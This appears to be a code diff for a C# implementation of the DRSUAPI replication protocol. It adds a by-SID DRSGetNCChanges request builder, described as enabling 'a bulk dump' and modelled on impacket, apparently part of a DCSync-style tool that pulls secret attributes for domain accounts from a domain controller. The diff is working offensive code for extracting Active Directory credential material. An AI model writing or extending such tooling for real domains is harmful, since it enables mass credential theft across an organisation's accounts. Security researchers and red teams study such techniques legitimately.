@@ -274,7 +274,18 @@ public static class Drsuapi
         AttObjectSid, AttSamAccountName, AttUserPrincipalName, AttUserAccountControl, AttPwdLastSet,
     };
 
-    public static byte[] BuildGetNCChangesStub(byte[] hDrs, Guid ntdsDsaGuid, Guid targetObjectGuid)
+    /// <summary>
+    /// Builds a DRSGetNCChanges request (V8, EXOP_REPL_OBJ) replicating a single object identified by
+    /// its <paramref name="packedSid"/> (a 28-byte NT4SID) instead of its objectGUID — the SID path
+    /// (impacket's DRSGetNCChangesSid) skips the per-account DRSCrackNames round-trip for a bulk dump.
+    /// </summary>
+    public static byte[] BuildGetNCChangesStubBySid(byte[] hDrs, Guid ntdsDsaGuid, byte[] packedSid) =>
+        BuildGetNCChangesStubCore(hDrs, ntdsDsaGuid, ndr => WriteDsNameSid(ndr, packedSid));
+
+    public static byte[] BuildGetNCChangesStub(byte[] hDrs, Guid ntdsDsaGuid, Guid targetObjectGuid) =>
+        BuildGetNCChangesStubCore(hDrs, ntdsDsaGuid, ndr => WriteDsName(ndr, targetObjectGuid));
+
+    private static byte[] BuildGetNCChangesStubCore(byte[] hDrs, Guid ntdsDsaGuid, Action<NdrWriter> writeNc)
     {
         uint[] attids = SecretAttids;
         var ndr = new NdrWriter();
@@ -300,7 +311,7 @@ public static class Drsuapi
         ndr.WriteReferent(false);        // PrefixTableDest.pPrefixEntry = NULL
 
         // Deferred pointees, in field order.
-        WriteDsName(ndr, targetObjectGuid);   // pNC -> DSNAME
+        writeNc(ndr);                         // pNC -> DSNAME (by GUID or by SID)
         WritePartialAttrSet(ndr, attids);     // pPartialAttrSet -> PARTIAL_ATTR_VECTOR_V1_EXT
         return ndr.ToArray();
     }
@@ -442,6 +453,21 @@ public static class Drsuapi
         ndr.WriteUInt32(0);                 // SidLen
         ndr.WriteBytes(objectGuid.ToByteArray()); // Guid (16)
         ndr.WriteBytes(new byte[28]);       // Sid (NT4SID, empty)
+        ndr.WriteUInt32(0);                 // NameLen
+        ndr.WriteUInt16(0);                 // StringName[0] = NUL
+        ndr.Align(4);
+    }
+
+    private static void WriteDsNameSid(NdrWriter ndr, byte[] packedSid)
+    {
+        // DSNAME for a SID target: SidLen = the SID's length, Guid empty, StringName just the NUL.
+        var sid28 = new byte[28];
+        Array.Copy(packedSid, sid28, Math.Min(packedSid.Length, 28));
+        ndr.WriteUInt32(1);                 // StringName conformant max_count
+        ndr.WriteUInt32(62);                // structLen (matches impacket for this shape)
+        ndr.WriteUInt32((uint)packedSid.Length); // SidLen
+        ndr.WriteBytes(new byte[16]);       // Guid (empty)
+        ndr.WriteBytes(sid28);              // Sid (NT4SID)
         ndr.WriteUInt32(0);                 // NameLen
         ndr.WriteUInt16(0);                 // StringName[0] = NUL
         ndr.Align(4);
